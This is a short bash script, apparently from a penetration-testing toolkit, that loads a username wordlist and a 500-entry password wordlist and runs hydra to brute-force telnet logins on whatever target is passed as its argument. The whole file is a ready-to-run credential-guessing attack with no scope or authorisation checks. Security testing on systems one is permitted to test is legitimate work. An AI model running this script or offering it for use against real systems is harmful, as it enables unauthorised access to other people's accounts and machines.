#!/bin/bash

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"

USERNAMES="$PROJECT_ROOT/wordlists/usernames.txt"
PASSWORDS="$PROJECT_ROOT/wordlists/500p.txt"
TARGET="${1:-}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>" >&2
    exit 1
fi

hydra -L "$USERNAMES" -P "$PASSWORDS" "telnet://$TARGET"
